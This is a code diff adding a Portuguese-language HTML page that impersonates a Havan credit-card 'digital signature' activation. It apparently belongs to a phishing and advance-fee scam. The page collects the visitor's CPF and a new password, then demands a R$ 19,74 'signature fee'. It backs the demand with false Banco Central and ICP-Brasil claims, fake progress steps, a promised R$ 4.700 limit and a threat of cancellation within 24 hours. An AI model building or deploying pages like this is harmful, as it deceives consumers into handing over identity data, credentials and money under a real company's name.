@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Havan Card - Assinatura Digital</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="assinatura-styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+        <div class="loading-container">
+            <div class="havan-logo">
+                <div class="logo-circle">
+                    <span class="logo-text">H</span>
+                </div>
+                <h2>HAVAN</h2>
+            </div>
+            
+            <div class="loading-content">
+                <h3 id="loadingTitle">Finalizando Ativação</h3>
+                <p id="loadingSubtitle">Verificando dados do cartão...</p>
+                
+                <div class="progress-steps">
+                    <div class="step completed" id="step1">
+                        <div class="step-icon">
+                            <i class="fas fa-check-circle"></i>
+                        </div>
+                        <div class="step-text">
+                            <span class="step-title">Pagamentos Confirmados</span>
+                            <span class="step-status">Válido ✓</span>
+                        </div>
+                    </div>
+                    
+                    <div class="step completed" id="step2">
+                        <div class="step-icon">
+                            <i class="fas fa-unlock-alt"></i>
+                        </div>
+                        <div class="step-text">
+                            <span class="step-title">Cartão Desbloqueado</span>
+                            <span class="step-status">Liberado ✓</span>
+                        </div>
+                    </div>
+                    
+                    <div class="step" id="step3">
+                        <div class="step-icon">
+                            <i class="fas fa-credit-card"></i>
+                        </div>
+                        <div class="step-text">
+                            <span class="step-title">Gerando Números do Cartão</span>
+                            <span class="step-status" id="status3">Processando...</span>
+                        </div>
+                        <div class="step-loader" id="loader3">
+                            <div class="spinner"></div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="success-message" id="successMessage" style="display: none;">
+                    <div class="success-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <h4>Cartão Totalmente Liberado!</h4>
+                    <p>Todos os processos foram concluídos com sucesso.</p>
+                </div>
+                
+                <div class="error-message" id="errorMessage" style="display: none;">
+                    <div class="error-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <h4>Assinatura Digital Pendente</h4>
+                    <p>É necessário completar a assinatura digital para ativar o cartão.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Login Screen -->
+    <div id="loginScreen" class="login-screen" style="display: none;">
+        <div class="login-container">
+            <div class="header">
+                <div class="havan-brand">
+                    <div class="brand-logo">
+                        <span>H</span>
+                    </div>
+                    <span class="brand-name">HAVAN</span>
+                </div>
+                <div class="header-subtitle">Assinatura Digital</div>
+            </div>
+            
+            <div class="login-content">
+                <div class="alert-box">
+                    <div class="alert-icon">
+                        <i class="fas fa-file-signature"></i>
+                    </div>
+                    <div class="alert-text">
+                        <h3>Assinatura Digital Obrigatória</h3>
+                        <p>Para ativar seu cartão Havan, é necessário completar a assinatura digital conforme regulamentação do Banco Central.</p>
+                    </div>
+                </div>
+                
+                <div class="login-form" id="loginForm">
+                    <h4>Acesse sua Conta Havan</h4>
+                    <div class="form-group">
+                        <label for="cpf">CPF</label>
+                        <input type="text" id="cpf" placeholder="000.000.000-00" maxlength="14">
+                        <div class="input-icon">
+                            <i class="fas fa-user"></i>
+                        </div>
+                    </div>
+                    <button class="login-btn" onclick="validateCPF()">
+                        <i class="fas fa-arrow-right"></i>
+                        CONTINUAR
+                    </button>
+                    <p class="security-note">
+                        <i class="fas fa-shield-alt"></i>
+                        Seus dados estão protegidos com criptografia de ponta
+                    </p>
+                </div>
+                
+                <div class="password-form" id="passwordForm" style="display: none;">
+                    <h4>Criar Senha do Aplicativo</h4>
+                    <p class="form-subtitle">Crie uma senha segura para acessar o app Havan</p>
+                    <div class="form-group">
+                        <label for="password">Nova Senha</label>
+                        <input type="password" id="password" placeholder="Mínimo 6 caracteres">
+                        <div class="input-icon">
+                            <i class="fas fa-lock"></i>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="confirmPassword">Confirmar Senha</label>
+                        <input type="password" id="confirmPassword" placeholder="Digite a senha novamente">
+                        <div class="input-icon">
+                            <i class="fas fa-lock"></i>
+                        </div>
+                    </div>
+                    <div class="password-requirements">
+                        <p><i class="fas fa-info-circle"></i> A senha deve ter pelo menos 6 caracteres</p>
+                    </div>
+                    <button class="login-btn" onclick="validatePassword()">
+                        <i class="fas fa-key"></i>
+                        CRIAR SENHA
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Signature Screen -->
+    <div id="signatureScreen" class="signature-screen" style="display: none;">
+        <div class="signature-container">
+            <div class="header">
+                <div class="havan-brand">
+                    <div class="brand-logo">
+                        <span>H</span>
+                    </div>
+                    <span class="brand-name">HAVAN</span>
+                </div>
+                <div class="header-subtitle">Assinatura Digital</div>
+            </div>
+            
+            <div class="signature-content">
+                <div class="signature-alert">
+                    <div class="alert-icon">
+                        <i class="fas fa-exclamation-triangle"></i>
+                    </div>
+                    <div class="alert-text">
+                        <h3>Taxa de Assinatura Digital</h3>
+                        <p>Para completar a assinatura digital e ativar seu cartão, é necessário o pagamento da taxa obrigatória.</p>
+                    </div>
+                </div>
+                
+                <div class="signature-info">
+                    <h4>Assinatura Digital Certificada</h4>
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <i class="fas fa-certificate"></i>
+                            <span>Certificado digital ICP-Brasil</span>
+                        </div>
+                        <div class="info-item">
+                            <i class="fas fa-shield-alt"></i>
+                            <span>Segurança bancária nível A1</span>
+                        </div>
+                        <div class="info-item">
+                            <i class="fas fa-gavel"></i>
+                            <span>Validade jurídica garantida</span>
+                        </div>
+                        <div class="info-item">
+                            <i class="fas fa-clock"></i>
+                            <span>Ativação em até 2 horas</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="fee-section">
+                    <div class="fee-box">
+                        <span class="fee-label">Taxa de Assinatura Digital:</span>
+                        <span class="fee-value">R$ 19,74</span>
+                    </div>
+                    <p class="fee-note">Pagamento único conforme regulamentação do Banco Central</p>
+                </div>
+                
+                <div class="warning-section">
+                    <div class="warning-box">
+                        <div class="warning-icon">
+                            <i class="fas fa-clock"></i>
+                        </div>
+                        <div class="warning-text">
+                            <h4>Prazo Limite: 24 horas</h4>
+                            <p>Caso a assinatura não seja completada, <strong>o cartão será automaticamente cancelado</strong> conforme política de segurança.</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="benefits-section">
+                    <h4>Após completar a assinatura digital:</h4>
+                    <div class="benefits-list">
+                        <div class="benefit">
+                            <i class="fas fa-check"></i>
+                            <span>Cartão ativado imediatamente</span>
+                        </div>
+                        <div class="benefit">
+                            <i class="fas fa-check"></i>
+                            <span>Limite de R$ 4.700,00 liberado</span>
+                        </div>
+                        <div class="benefit">
+                            <i class="fas fa-check"></i>
+                            <span>App Havan totalmente funcional</span>
+                        </div>
+                        <div class="benefit">
+                            <i class="fas fa-check"></i>
+                            <span>Uso imediato em todo o Brasil</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="signature-btn" onclick="redirectToSignaturePayment()">
+                    <i class="fas fa-file-signature"></i>
+                    PAGAR E ASSINAR DIGITALMENTE
+                </button>
+                
+                <p class="urgency-note">
+                    <i class="fas fa-exclamation-circle"></i>
+                    Assinatura obrigatória para não perder o cartão
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script src="assinatura-script.js"></script>
+</body>
+</html>
+
